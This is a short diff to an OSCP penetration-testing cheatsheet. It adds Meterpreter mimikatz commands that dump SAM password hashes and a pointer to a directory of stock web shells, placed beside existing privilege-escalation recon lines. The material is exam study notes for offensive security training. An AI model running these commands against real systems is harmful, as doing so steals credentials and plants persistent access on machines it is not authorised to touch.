@@ -36,6 +36,13 @@ wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr
 
 meterpreter post/multi/recon/local_exploit_suggester 
 
+use mimikatz
+msv
+mimikatz_command -f samdump::hashes
+
+basic webshell
+/usr/share/webshells
+
 # Table Of Content
 - [OSCP Cheatsheet](#oscp-cheatsheet)
   * [Disclaimer](#disclaimer)
